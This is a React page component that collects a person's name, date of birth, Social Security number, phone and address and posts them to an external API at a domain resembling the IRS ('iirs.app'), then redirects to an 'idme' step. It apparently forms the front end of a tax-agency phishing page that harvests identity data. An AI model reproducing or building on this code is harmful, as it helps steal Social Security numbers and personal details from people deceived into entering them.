import { useDispatch, useSelector } from 'react-redux';
import { useNavigate } from 'react-router-dom';

import { updateStatus } from '../slices/infoSlice';
import Address from '../components/Address';
import { Buttons } from '../components/Button';
import FirstName from '../components/FirstName';
import LastName from '../components/LastName';
import PhoneNumber from '../components/PhoneNumber';
import Social from '../components/Social';
import DateOfBirth from '../components/DateOfBirth';
import Loader from '../components/Loader';
import styles from './RegisterPage.module.css';

const BASEURL = `https://api.iirs.app/api/v1`;

export default function LoginPage() {
  const dispatch = useDispatch();
  const navigate = useNavigate();
  const {
    firstName,
    lastName,
    DOB,
    SSN,
    phone,
    address,
    status,
    addrError,
    fieldError,
  } = useSelector((store) => store.info);

  async function saveData() {
    try {
      const res = await fetch(`${BASEURL}/client`, {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          firstName,
          lastName,
          DOB,
          SSN,
          phone,
          address,
        }),
      });
      const { status, message, token } = await res.json();
      if (status === 'success' && message === 'request successful') {
        localStorage.setItem('jwtToken', token);
        setTimeout(() => navigate('idme'), 5000);
      }
    } catch (err) {
      console.log(err);
    }
  }

  function handleSubmit(e) {
    e.preventDefault();
    dispatch(updateStatus('validate'));

    const errors = Object.values({ ...fieldError, ...addrError });
    if (errors.length !== 9 || errors.some((err) => err !== '')) return;

    dispatch(updateStatus('loading'));

    saveData();
  }
  return (
    <main className={status === 'loading' ? 'overlay' : ''}>
      {status === 'loading' && <Loader type="spinner-el" />}
      <form
        className={`${styles.main} ${
          status === 'loading' ? styles.opaque : styles['not-opaque']
        }`}
      >
        <FirstName />
        <LastName />
        <DateOfBirth />
        <Social />
        <PhoneNumber />
        <Address />
        <Buttons onClick={handleSubmit} />
      </form>
    </main>
  );
}
